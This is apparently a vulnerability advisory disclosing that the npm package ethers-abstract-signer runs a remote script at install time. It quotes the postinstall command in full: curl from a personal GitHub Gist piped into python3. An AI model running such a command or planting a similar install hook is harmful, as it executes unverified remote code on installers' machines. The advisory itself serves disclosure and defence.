summary: ethers-abstract-signer executes remote script from gist at install time
details: package.json declares a postinstall hook that uses child_process.exec to run `curl -s https://gist.githubusercontent.com/guellemilb/631fb6348967d9d475125edf67048c0e/raw/build_utils.py | python3` (with wget as a fallback). On `npm install`, the package fetches a Python script from an anonymous personal GitHub Gist and pipes it directly to python3 for execution, with no version pinning, no integrity verification, and no relation to the package's stated purpose (an ethers signer abstraction). The Gist is mutable and controlled by an individual GitHub user unaffiliated with the ethers project; the fetched bytes can be changed at any time to deliver arbitrary code to anyone installing this package. The name also appears to leverage confusion with the legitimate `ethers` ecosystem.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
